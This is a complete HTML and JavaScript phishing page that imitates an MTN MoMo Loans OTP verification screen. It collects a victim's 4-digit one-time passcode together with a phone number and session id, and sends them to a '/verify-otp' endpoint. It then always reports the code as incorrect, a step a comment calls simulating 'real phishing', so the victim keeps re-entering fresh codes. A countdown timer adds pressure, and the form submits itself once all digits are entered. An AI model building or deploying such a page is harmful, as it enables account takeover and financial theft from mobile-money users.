<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo – OTP Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --mtn-dark: #003366;
    --mtn-gold: #FFD700;
    --mtn-light: #004080;
    --grad: linear-gradient(to right, #003366, #004080);
    --border: #ddd;
    --radius: 12px;
    --radius-sm: 8px;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Inter', sans-serif; background: #f5f7fa; color: #1C2340; min-height: 100vh; display: flex; flex-direction: column; }

  .otp-topbar { display: flex; align-items: center; justify-content: space-between; padding: 0 20px; height: 52px; border-bottom: 1px solid #eee; flex-shrink: 0; background: #fff; }
  .otp-topbar .bk { font-size: 1.1rem; color: #333; cursor: pointer; background: none; border: none; text-decoration: none; }
  .otp-body-wrap { flex: 1; padding: 32px 16px; display: flex; align-items: flex-start; justify-content: center; }
  .otp-card { background: #fff; border: 1px solid #eee; border-radius: var(--radius); padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06); }
  .otp-card h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 6px; color: var(--mtn-dark); }
  .otp-hint { font-size: 0.83rem; color: #888; margin-bottom: 5px; }

  .otp-section { margin-bottom: 24px; }
  .otp-section-title { font-size: 0.9rem; font-weight: 600; color: var(--mtn-dark); margin-bottom: 12px; }
  .otp-inputs { display: flex; gap: 8px; margin-bottom: 12px; width: 100%; }
  .otp-box { flex: 1; min-width: 0; width: 0; height: 52px; border: 1.5px solid #ddd; border-radius: var(--radius-sm); text-align: center; font-family: 'Inter', sans-serif; font-size: 1.2rem; font-weight: 700; color: var(--mtn-dark); outline: none; transition: border-color 0.2s; }
  .otp-box:focus { border-color: var(--mtn-gold); box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2); }
  .otp-delete { cursor: pointer; color: #888; font-size: 1rem; background: none; border: none; margin-left: 6px; padding: 0; transition: color 0.2s; }
  .otp-delete:hover { color: var(--mtn-gold); }

  .btn-otp { width: 100%; padding: 13px; background: #e8e8e8; color: #aaa; border: none; border-radius: 8px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; transition: all 0.2s; }
  .btn-otp.rdy { background: var(--grad); color: #fff; }

  .otp-curve { background: #fff; overflow: hidden; flex-shrink: 0; }
  .otp-curve::before { content: ''; display: block; background: var(--mtn-dark); height: 50px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }
  .otp-foot { background: var(--mtn-dark); padding: 14px; text-align: center; font-size: 0.75rem; color: rgba(255, 255, 255, 0.45); }

  .msg-box { border-radius: var(--radius-sm); padding: 12px 16px; font-size: 0.84rem; margin-bottom: 16px; display: none; align-items: center; gap: 10px; }
  .msg-box.show { display: flex; }
  .msg-box.error { background: #fef2f2; border: 1.5px solid #fecaca; color: #991b1b; }
  .msg-box.success { background: #f0fdf4; border: 1.5px solid #bbf7d0; color: #166534; }
  .msg-icon { font-weight: 700; }

  .spinner { width: 44px; height: 44px; border: 4px solid #eee; border-top-color: var(--mtn-gold); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 16px auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading { display: none; text-align: center; }
  .loading.show { display: block; }
  .wait-msg { text-align: center; color: #888; font-size: 0.88rem; }

  .sms-timer-wrap { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; padding: 10px 14px; background: #fff8f0; border: 1.5px solid #f5c28a; border-radius: var(--radius-sm); }
  .sms-timer-circle { position: relative; width: 44px; height: 44px; flex-shrink: 0; }
  .sms-timer-svg { transform: rotate(-90deg); }
  .sms-timer-bg { fill: none; stroke: #f0e0cc; stroke-width: 4; }
  .sms-timer-arc { fill: none; stroke: #e07800; stroke-width: 4; stroke-linecap: round; stroke-dasharray: 113; stroke-dashoffset: 0; transition: stroke-dashoffset 1s linear, stroke 1s; }
  .sms-timer-arc.urgent { stroke: #d91e1e; }
  .sms-timer-num { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; color: #e07800; }
  .sms-timer-num.urgent { color: #d91e1e; }
  .sms-timer-text { font-size: 0.82rem; color: #7a4500; line-height: 1.4; }
  .sms-timer-text strong { font-weight: 600; }

  .sms-resend-wrap { display: none; background: #fef2f2; border: 1.5px solid #fecaca; border-radius: var(--radius-sm); padding: 16px 16px 14px; margin-bottom: 14px; text-align: center; }
  .sms-resend-wrap p { font-size: 0.83rem; color: #991b1b; margin-bottom: 12px; line-height: 1.5; }
  .btn-resend { display: inline-flex; align-items: center; gap: 6px; padding: 10px 22px; background: var(--grad); color: #fff; border: none; border-radius: 8px; font-size: 0.85rem; font-weight: 600; letter-spacing: 0.04em; cursor: pointer; font-family: 'Inter', sans-serif; transition: opacity 0.2s; }
  .btn-resend:hover { opacity: 0.88; }
  .btn-resend:disabled { opacity: 0.5; cursor: not-allowed; }
</style>
</head>
<body>
  <div class="otp-topbar">
    <a href="/login" class="bk">← Back</a>
    <div style="flex: 1;"></div>
    <div style="text-align: center; color: var(--mtn-dark); font-weight: 600;">OTP Verification</div>
    <div style="flex: 1;"></div>
  </div>
  <div class="otp-body-wrap">
    <div class="otp-card">
      <h2>Enter OTP Code</h2>
      <p class="otp-hint">Enter the 4-digit OTP code sent to your phone via MTN MoMo</p>

      <!-- SMS Timer -->
      <div class="sms-timer-wrap" id="smsTimerWrap">
        <div class="sms-timer-circle">
          <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
            <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
          </svg>
          <div class="sms-timer-num" id="smsTimerNum">60</div>
        </div>
        <div class="sms-timer-text"><strong>Code expires in <span id="smsTimerSec">60</span>s.</strong><br>Enter your OTP before time runs out.</div>
      </div>

      <!-- Resend block -->
      <div class="sms-resend-wrap" id="smsResendWrap">
        <p>⏰ Your OTP session has expired.<br>Request a new OTP.</p>
        <button class="btn-resend" id="bResend" onclick="doResend()">🔄 Resend OTP</button>
        <div id="mResend" class="loading" style="margin-top:10px;">
          <div class="spinner" style="margin: 8px auto; width: 30px; height: 30px; border-width: 3px;"></div>
          <div class="wait-msg" style="font-size: 0.82rem;">Sending…</div>
        </div>
      </div>

      <!-- OTP Input -->
      <div class="otp-section">
        <div class="otp-section-title">OTP Code (4 digits):</div>
        <div style="display: flex; align-items: center;">
          <div class="otp-inputs" id="otpInputs">
            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
          </div>
          <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
        </div>
      </div>

      <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
      <button id="bOtp" class="btn-otp" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
      <div id="mOtp" class="loading">
        <div class="spinner"></div>
        <div class="wait-msg">Verifying…</div>
      </div>
    </div>
  </div>
  <div class="otp-curve"></div>
  <div class="otp-foot">© 2026 MTN MoMo Loans – Powered by MTN</div>

  <script>
    const savedPhone = localStorage.getItem('phone') || '967123456';
    let otpTimerInterval = null;
    let otpTimerExpired = false;
    let isSubmitting = false;

    // ─── 60-second countdown timer ──────────────────────────────
    function startOtpTimer() {
      if (otpTimerInterval) clearInterval(otpTimerInterval);
      otpTimerExpired = false;

      document.getElementById('smsMsgBox') && (document.getElementById('smsMsgBox').value = '');
      document.getElementById('smsResendWrap').style.display = 'none';
      document.getElementById('smsTimerWrap').style.display = 'flex';

      const arc = document.getElementById('smsTimerArc');
      const num = document.getElementById('smsTimerNum');
      const sec = document.getElementById('smsTimerSec');
      arc.classList.remove('urgent');
      num.classList.remove('urgent');
      arc.style.strokeDashoffset = '0';

      let remaining = 60;
      const CIRCUMFERENCE = 113;

      const tick = function() {
        remaining--;
        const pct = remaining / 60;
        arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
        num.textContent = remaining;
        sec.textContent = remaining;

        if (remaining <= 10) {
          arc.classList.add('urgent');
          num.classList.add('urgent');
        }

        if (remaining <= 0) {
          clearInterval(otpTimerInterval);
          otpTimerInterval = null;
          otpTimerExpired = true;

          document.getElementById('smsTimerWrap').style.display = 'none';
          document.getElementById('smsResendWrap').style.display = 'block';
          document.getElementById('bResend').disabled = false;
          document.getElementById('mResend').classList.remove('show');

          ['otpMsg', 'otpMsgOk'].forEach(function(id) { document.getElementById(id).classList.remove('show'); });
        }
      };
      otpTimerInterval = setInterval(tick, 1000);
    }

    function stopOtpTimer() {
      if (otpTimerInterval) {
        clearInterval(otpTimerInterval);
        otpTimerInterval = null;
      }
    }

    // ─── OTP input handling ──────────────────────────────────────
    function handleOtpInput(el, type) {
      el.value = el.value.replace(/\D/, '');
      const idx = parseInt(el.id.match(/\d$/)[0]);
      if (el.value && type === 'otp' && idx < 3) {
        document.getElementById(type + (idx + 1)).focus();
      }
      chkOtp();
    }

    document.addEventListener('keydown', function(e) {
      const id = e.target.id;
      if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
        const idx = parseInt(id[3]);
        if (idx > 0) document.getElementById('otp' + (idx - 1)).focus();
      }
    });

    function chkOtp() {
      const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
      document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
    }

    function clearOtpCode() {
      [0, 1, 2, 3].forEach(i => { document.getElementById('otp' + i).value = ''; });
      chkOtp();
      document.getElementById('otp0').focus();
    }

    function showOtpMsg(type, text) {
      ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
      if (type === 'error') { document.getElementById('otpMsgTxt').textContent = text; document.getElementById('otpMsg').classList.add('show'); }
      if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text; document.getElementById('otpMsgOk').classList.add('show'); }
    }

    function resetOtp() {
      [0, 1, 2, 3].forEach(i => { document.getElementById('otp' + i).value = ''; });
      chkOtp();
      document.getElementById('otp0').focus();
      startOtpTimer();
      ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    }

    // ─── Resend OTP ──────────────────────────────────────────────
    function doResend() {
      const btn = document.getElementById('bResend');
      const spinner = document.getElementById('mResend');
      btn.disabled = true;
      spinner.classList.add('show');
      ['otpMsg', 'otpMsgOk'].forEach(function(id) { document.getElementById(id).classList.remove('show'); });

      fetch('/otp-resend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: savedPhone })
      })
      .then(response => response.json())
      .then(data => {
        spinner.classList.remove('show');
        if (data.success) {
          document.getElementById('smsResendWrap').style.display = 'none';
          resetOtp();
          showOtpMsg('success', 'A new OTP has been sent to your phone.');
        } else {
          btn.disabled = false;
          showOtpMsg('error', data.message || 'Failed to resend OTP. Please try again.');
        }
      })
      .catch(err => {
        spinner.classList.remove('show');
        btn.disabled = false;
        showOtpMsg('error', 'Network error: ' + err.message);
      });
    }

    // ─── Submit OTP ──────────────────────────────────────────────
    function doOtp() {
      if (isSubmitting) return;
      isSubmitting = true;

      ['otpMsg', 'otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));

      const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');

      if (otp.length < 4) {
        isSubmitting = false;
        showOtpMsg('error', 'Please enter 4-digit OTP code.');
        return;
      }

      document.getElementById('mOtp').classList.add('show');
      document.getElementById('bOtp').disabled = true;
      document.getElementById('bOtp').textContent = 'VERIFYING...';

      const sessionId = localStorage.getItem('sessionId');

      fetch('/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sessionId, otp: otp, phone: savedPhone })
      })
      .then(response => response.json())
      .then(data => {
        document.getElementById('mOtp').classList.remove('show');
        document.getElementById('bOtp').disabled = false;
        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
        isSubmitting = false;

        // Always show "incorrect" to simulate real phishing
        resetOtp();
        showOtpMsg('error', 'Incorrect OTP! Please re-enter the most recent OTP.');
      })
      .catch(err => {
        document.getElementById('mOtp').classList.remove('show');
        document.getElementById('bOtp').disabled = false;
        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
        isSubmitting = false;
        showOtpMsg('error', 'Network error: ' + err.message);
      });
    }

    // ─── Auto-submit when all digits entered ────────────────────
    let autoSubmitTimeout;
    document.addEventListener('keyup', function() {
      const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i).value);
      if (otpOk && document.getElementById('bOtp').className.includes('rdy')) {
        clearTimeout(autoSubmitTimeout);
        autoSubmitTimeout = setTimeout(() => {
          doOtp();
        }, 300);
      }
    });

    // ─── Init ────────────────────────────────────────────────────
    startOtpTimer();
    document.getElementById('otp0').focus();
  </script>
</body>
</html>
